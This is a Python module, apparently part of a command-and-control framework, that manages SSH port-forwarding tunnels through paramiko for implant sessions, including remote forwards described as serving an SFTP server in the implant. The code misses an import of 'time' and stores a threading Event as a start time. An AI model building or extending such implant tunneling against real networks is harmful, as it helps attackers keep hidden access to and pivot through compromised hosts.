import paramiko
import socket
import logging
import threading
import os
from typing import Dict, List, Optional, Tuple, Any

logger = logging.getLogger('c2.tunnel')

class TunnelEndpoint:
    """Represents a single tunnel endpoint"""
    def __init__(self, session_id: str, bind_address: str, bind_port: int, 
                 target_address: str, target_port: int, tunnel_type: str, active: bool = False):
        self.id = f"{session_id}_{bind_address}_{bind_port}"  # Unique ID
        self.session_id = session_id
        self.bind_address = bind_address
        self.bind_port = bind_port
        self.target_address = target_address
        self.target_port = target_port
        self.tunnel_type = tunnel_type  # 'local', 'remote', or 'dynamic'
        self.active = active
        self.server_socket = None
        self.connections: List[socket.socket] = []
        self.start_time = None
        self.bytes_in = 0
        self.bytes_out = 0
        
    def to_dict(self) -> Dict[str, Any]:
        """Convert to dictionary for serialization"""
        return {
            'id': self.id,
            'session_id': self.session_id,
            'bind_address': self.bind_address,
            'bind_port': self.bind_port,
            'target_address': self.target_address,
            'target_port': self.target_port,
            'tunnel_type': self.tunnel_type,
            'active': self.active,
            'start_time': self.start_time,
            'bytes_in': self.bytes_in,
            'bytes_out': self.bytes_out
        }


class SFTPTunnelManager:
    """Manages SSH tunnels for SFTP and other services"""
    
    def __init__(self):
        self.tunnels: Dict[str, TunnelEndpoint] = {}  # Maps tunnel ID to TunnelEndpoint
        self.session_tunnels: Dict[str, List[str]] = {}  # Maps session ID to list of tunnel IDs
        
    def create_local_tunnel(self, session_id: str, session_channel, 
                           local_bind_address: str, local_bind_port: int,
                           remote_host: str, remote_port: int) -> Optional[TunnelEndpoint]:
        """
        Creates a local tunnel (SFTP client connects to local port which forwards to remote server)
        """
        try:
            tunnel_id = f"{session_id}_{local_bind_address}_{local_bind_port}"
            
            if tunnel_id in self.tunnels:
                logger.warning(f"Tunnel already exists: {tunnel_id}")
                return None
                
            # Create the tunnel endpoint
            tunnel = TunnelEndpoint(
                session_id=session_id,
                bind_address=local_bind_address,
                bind_port=local_bind_port,
                target_address=remote_host,
                target_port=remote_port,
                tunnel_type='local'
            )
            
            # Start the tunnel
            self._start_local_tunnel(tunnel, session_channel)
            
            # Register the tunnel
            self.tunnels[tunnel_id] = tunnel
            if session_id not in self.session_tunnels:
                self.session_tunnels[session_id] = []
            self.session_tunnels[session_id].append(tunnel_id)
            
            logger.info(f"Created local tunnel: {local_bind_address}:{local_bind_port} -> {remote_host}:{remote_port}")
            return tunnel
            
        except Exception as e:
            logger.error(f"Failed to create local tunnel: {e}")
            return None
            
    def _start_local_tunnel(self, tunnel: TunnelEndpoint, session_channel):
        """Start a local port forward tunnel"""
        try:
            # Create a server socket that will listen for connections
            server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            server_socket.bind((tunnel.bind_address, tunnel.bind_port))
            server_socket.listen(5)
            
            tunnel.server_socket = server_socket
            tunnel.active = True
            tunnel.start_time = threading.Event()
            tunnel.start_time.set()
            
            # Start thread to accept connections
            threading.Thread(
                target=self._local_tunnel_acceptor, 
                args=(tunnel, session_channel),
                daemon=True
            ).start()
            
        except Exception as e:
            logger.error(f"Failed to start local tunnel: {e}")
            tunnel.active = False
            if tunnel.server_socket:
                tunnel.server_socket.close()
                tunnel.server_socket = None
    
    def _local_tunnel_acceptor(self, tunnel: TunnelEndpoint, session_channel):
        """Accept connections on the local socket and forward to remote"""
        try:
            while tunnel.active:
                try:
                    client_socket, client_addr = tunnel.server_socket.accept()
                    logger.debug(f"New connection to tunnel {tunnel.id} from {client_addr}")
                    
                    # Start channel for this connection through the SSH transport
                    transport = session_channel.get_transport()
                    if not transport or not transport.is_active():
                        logger.error(f"Transport for tunnel {tunnel.id} is not active")
                        client_socket.close()
                        continue
                        
                    # Open direct-tcpip channel to target
                    dest_addr = (tunnel.target_address, tunnel.target_port)
                    src_addr = client_socket.getpeername()
                    channel = transport.open_channel("direct-tcpip", dest_addr, src_addr)
                    
                    if not channel:
                        logger.error(f"Could not open channel for tunnel {tunnel.id}")
                        client_socket.close()
                        continue
                    
                    # Track the connection
                    tunnel.connections.append(client_socket)
                    
                    # Start forwarding threads
                    threading.Thread(
                        target=self._forward_data,
                        args=(client_socket, channel, tunnel, "in"),
                        daemon=True
                    ).start()
                    
                    threading.Thread(
                        target=self._forward_data,
                        args=(channel, client_socket, tunnel, "out"),
                        daemon=True
                    ).start()
                    
                except Exception as e:
                    if tunnel.active:  # Only log if we're supposed to be running
                        logger.error(f"Error in tunnel acceptor: {e}")
                    break
                    
        except Exception as e:
            logger.error(f"Tunnel acceptor crashed: {e}")
        finally:
            tunnel.active = False
            if tunnel.server_socket:
                tunnel.server_socket.close()
                tunnel.server_socket = None
    
    def _forward_data(self, src, dst, tunnel: TunnelEndpoint, direction: str):
        """Forward data between socket and channel"""
        try:
            while tunnel.active:
                try:
                    if isinstance(src, paramiko.Channel):
                        if src.recv_ready():
                            data = src.recv(16384)
                        else:
                            time.sleep(0.1)
                            continue
                    else:
                        data = src.recv(16384)
                        
                    if not data:
                        break
                        
                    # Update bytes counter
                    if direction == "in":
                        tunnel.bytes_in += len(data)
                    else:
                        tunnel.bytes_out += len(data)
                        
                    # Send to destination
                    if isinstance(dst, paramiko.Channel):
                        dst.send(data)
                    else:
                        dst.sendall(data)
                except socket.timeout:
                    continue
                except Exception as e:
                    logger.error(f"Forward error in {direction}: {e}")
                    break
        except Exception as e:
            logger.error(f"Forwarder crashed: {e}")
        finally:
            # Clean up
            if isinstance(src, paramiko.Channel) and not src.closed:
                src.close()
            if isinstance(dst, paramiko.Channel) and not dst.closed:
                dst.close()
            if isinstance(src, socket.socket):
                src.close()
            if isinstance(dst, socket.socket):
                dst.close()
                
            # Remove from connections list
            if isinstance(src, socket.socket) and src in tunnel.connections:
                tunnel.connections.remove(src)
            if isinstance(dst, socket.socket) and dst in tunnel.connections:
                tunnel.connections.remove(dst)
    
    def create_remote_tunnel(self, session_id: str, session_channel,
                            remote_bind_address: str, remote_bind_port: int,
                            local_host: str, local_port: int) -> Optional[TunnelEndpoint]:
        """
        Create a remote tunnel (client listens on remote end, forwards to local server)
        This is what's needed for SFTP server functionality in the implant
        """
        try:
            tunnel_id = f"{session_id}_{remote_bind_address}_{remote_bind_port}"
            
            if tunnel_id in self.tunnels:
                logger.warning(f"Tunnel already exists: {tunnel_id}")
                return None
                
            # Create the tunnel endpoint
            tunnel = TunnelEndpoint(
                session_id=session_id,
                bind_address=remote_bind_address,
                bind_port=remote_bind_port,
                target_address=local_host,
                target_port=local_port,
                tunnel_type='remote'
            )
            
            # Request the forward on the transport
            transport = session_channel.get_transport()
            if not transport or not transport.is_active():
                logger.error(f"Transport not active for session {session_id}")
                return None
                
            # Request remote port forwarding
            try:
                transport.request_port_forward(
                    remote_bind_address, 
                    remote_bind_port
                )
                logger.info(f"Requested remote port forward: {remote_bind_address}:{remote_bind_port}")
                
                # Set up handler for incoming channels
                if not hasattr(transport, '_remote_tunnels'):
                    transport._remote_tunnels = {}
                    # Set up a transport listener
                    transport.set_channel_callback(self._handle_channel)
                
                # Register this tunnel with the transport
                transport._remote_tunnels[(remote_bind_address, remote_bind_port)] = (local_host, local_port, tunnel)
                
                # Register the tunnel
                tunnel.active = True
                tunnel.start_time = threading.Event()
                tunnel.start_time.set()
                self.tunnels[tunnel_id] = tunnel
                if session_id not in self.session_tunnels:
                    self.session_tunnels[session_id] = []
                self.session_tunnels[session_id].append(tunnel_id)
                
                logger.info(f"Created remote tunnel: {remote_bind_address}:{remote_bind_port} -> {local_host}:{local_port}")
                return tunnel
                
            except Exception as e:
                logger.error(f"Failed to request port forward: {e}")
                return None
                
        except Exception as e:
            logger.error(f"Failed to create remote tunnel: {e}")
            return None
    
    def _handle_channel(self, channel):
        """Handle incoming channels from remote port forwards"""
        if not isinstance(channel, paramiko.Channel):
            return
            
        # Check if this is a forwarded-tcpip channel
        if channel.get_name() != 'forwarded-tcpip':
            return
            
        try:
            transport = channel.get_transport()
            if not hasattr(transport, '_remote_tunnels'):
                logger.warning("Got forwarded channel but no registered tunnels")
                channel.close()
                return
                
            chaninfo = channel.get_extra_info()
            remote_addr = (chaninfo['addr'], chaninfo['port'])
            origin = (chaninfo['origin_addr'], chaninfo['origin_port'])
            
            # Find the tunnel for this channel
            for bind_addr, tunnel_info in transport._remote_tunnels.items():
                if bind_addr[0] == remote_addr[0] and bind_addr[1] == remote_addr[1]:
                    local_host, local_port, tunnel = tunnel_info
                    
                    # Connect to local target
                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    try:
                        sock.connect((local_host, local_port))
                    except Exception as e:
                        logger.error(f"Failed to connect to local target {local_host}:{local_port}: {e}")
                        channel.close()
                        sock.close()
                        return
                        
                    # Track the connection
                    tunnel.connections.append(sock)
                    
                    # Start forwarding in both directions
                    threading.Thread(
                        target=self._forward_data,
                        args=(sock, channel, tunnel, "in"),
                        daemon=True
                    ).start()
                    
                    threading.Thread(
                        target=self._forward_data,
                        args=(channel, sock, tunnel, "out"),
                        daemon=True
                    ).start()
                    
                    logger.debug(f"Handling remote forward from {origin} to {local_host}:{local_port}")
                    return
                    
            # If we get here, no tunnel matched
            logger.warning(f"Unknown forwarded channel for {remote_addr} from {origin}")
            channel.close()
            
        except Exception as e:
            logger.error(f"Error handling forwarded channel: {e}")
            if channel and not channel.closed:
                channel.close()
    
    def create_dynamic_tunnel(self, session_id: str, session_channel,
                             bind_address: str, bind_port: int) -> Optional[TunnelEndpoint]:
        """
        Create a dynamic (SOCKS) tunnel - not needed for SFTP but included for completeness
        """
        try:
            tunnel_id = f"{session_id}_{bind_address}_{bind_port}_dynamic"
            
            if tunnel_id in self.tunnels:
                logger.warning(f"Tunnel already exists: {tunnel_id}")
                return None
                
            # Create the tunnel endpoint
            tunnel = TunnelEndpoint(
                session_id=session_id,
                bind_address=bind_address,
                bind_port=bind_port,
                target_address='',  # Dynamic tunnels don't have fixed targets
                target_port=0,
                tunnel_type='dynamic'
            )
            
            # Start the tunnel
            self._start_dynamic_tunnel(tunnel, session_channel)
            
            # Register the tunnel
            self.tunnels[tunnel_id] = tunnel
            if session_id not in self.session_tunnels:
                self.session_tunnels[session_id] = []
            self.session_tunnels[session_id].append(tunnel_id)
            
            logger.info(f"Created dynamic tunnel on {bind_address}:{bind_port}")
            return tunnel
            
        except Exception as e:
            logger.error(f"Failed to create dynamic tunnel: {e}")
            return None
            
    def _start_dynamic_tunnel(self, tunnel: TunnelEndpoint, session_channel):
        """Start a dynamic (SOCKS) tunnel"""
        # Not implementing SOCKS proxy details here as it's not required for SFTP
        # This is just a placeholder for future extensions
        pass
    
    def close_tunnel(self, tunnel_id: str) -> bool:
        """Close a specific tunnel"""
        if tunnel_id not in self.tunnels:
            logger.warning(f"Tunnel not found: {tunnel_id}")
            return False
            
        tunnel = self.tunnels[tunnel_id]
        return self._close_tunnel_endpoint(tunnel)
    
    def _close_tunnel_endpoint(self, tunnel: TunnelEndpoint) -> bool:
        """Close a tunnel endpoint and clean up resources"""
        try:
            tunnel.active = False
            
            # Close server socket if exists
            if tunnel.server_socket:
                tunnel.server_socket.close()
                tunnel.server_socket = None
                
            # Close all connections
            for conn in tunnel.connections[:]:  # Make a copy as we'll modify during iteration
                try:
                    conn.close()
                except:
                    pass
            tunnel.connections.clear()
            
            # For remote tunnels, cancel port forwarding
            if tunnel.tunnel_type == 'remote':
                # Find the session channel
                from ..session_manager import SessionManager
                session_mgr = SessionManager.get_instance()
                session = session_mgr.get_session(tunnel.session_id)
                if session and session.channel:
                    transport = session.channel.get_transport()
                    if transport and transport.is_active():
                        try:
                            transport.cancel_port_forward(
                                tunnel.bind_address, 
                                tunnel.bind_port
                            )
                            logger.info(f"Cancelled remote port forward: {tunnel.bind_address}:{tunnel.bind_port}")
                            
                            # Remove from transport's tunnel registry
                            if hasattr(transport, '_remote_tunnels'):
                                key = (tunnel.bind_address, tunnel.bind_port)
                                if key in transport._remote_tunnels:
                                    del transport._remote_tunnels[key]
                        except Exception as e:
                            logger.error(f"Failed to cancel port forward: {e}")
            
            # Remove from registries
            if tunnel.id in self.tunnels:
                del self.tunnels[tunnel.id]
            if tunnel.session_id in self.session_tunnels:
                if tunnel.id in self.session_tunnels[tunnel.session_id]:
                    self.session_tunnels[tunnel.session_id].remove(tunnel.id)
                if not self.session_tunnels[tunnel.session_id]:
                    del self.session_tunnels[tunnel.session_id]
            
            logger.info(f"Closed tunnel: {tunnel.id}")
            return True
            
        except Exception as e:
            logger.error(f"Error closing tunnel: {e}")
            return False
    
    def close_session_tunnels(self, session_id: str) -> bool:
        """Close all tunnels for a session"""
        if session_id not in self.session_tunnels:
            return True  # No tunnels to close
            
        success = True
        for tunnel_id in self.session_tunnels[session_id][:]:  # Make a copy
            if not self.close_tunnel(tunnel_id):
                success = False
                
        return success
    
    def get_tunnel(self, tunnel_id: str) -> Optional[TunnelEndpoint]:
        """Get a tunnel by ID"""
        return self.tunnels.get(tunnel_id)
    
    def get_session_tunnels(self, session_id: str) -> List[TunnelEndpoint]:
        """Get all tunnels for a session"""
        if session_id not in self.session_tunnels:
            return []
            
        return [self.tunnels[tid] for tid in self.session_tunnels[session_id] if tid in self.tunnels]
    
    def get_all_tunnels(self) -> List[TunnelEndpoint]:
        """Get all active tunnels"""
        return list(self.tunnels.values())


# Singleton pattern
_instance = None

def get_tunnel_manager() -> SFTPTunnelManager:
    global _instance
    if _instance is None:
        _instance = SFTPTunnelManager()
    return _instance